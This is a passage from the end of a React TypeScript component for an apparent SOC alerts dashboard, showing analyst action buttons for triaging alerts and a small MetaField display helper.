                <div className="px-5 py-3 border-t border-border bg-card/40 backdrop-blur-sm">
                  <p className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium mb-2">SOC Analyst Actions</p>
                  <div className="grid grid-cols-2 gap-2">
                    <button className="flex items-center justify-center gap-1.5 px-3 py-2 text-xs font-medium rounded-md bg-primary/10 text-primary border border-primary/20 hover:bg-primary/20 transition-colors">
                      <Play className="w-3.5 h-3.5" />
                      Start Investigation
                    </button>
                    <button className="flex items-center justify-center gap-1.5 px-3 py-2 text-xs font-medium rounded-md bg-green-500/10 text-green-400 border border-green-500/20 hover:bg-green-500/20 transition-colors">
                      <ThumbsUp className="w-3.5 h-3.5" />
                      True Positive
                    </button>
                    <button className="flex items-center justify-center gap-1.5 px-3 py-2 text-xs font-medium rounded-md bg-orange-500/10 text-orange-400 border border-orange-500/20 hover:bg-orange-500/20 transition-colors">
                      <ThumbsDown className="w-3.5 h-3.5" />
                      False Positive
                    </button>
                    <button className="flex items-center justify-center gap-1.5 px-3 py-2 text-xs font-medium rounded-md bg-muted/30 text-muted-foreground border border-border hover:bg-muted/50 transition-colors">
                      <XCircle className="w-3.5 h-3.5" />
                      Close Alert
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </main>
  );
};

const MetaField = ({ label, value, mono }: { label: string; value: string; mono?: boolean }) => (
  <div>
    <span className="text-[10px] text-muted-foreground uppercase tracking-wider block mb-0.5">{label}</span>
    <span className={cn("text-xs text-foreground", mono && "font-mono")}>{value}</span>
  </div>
);

export default Alerts;
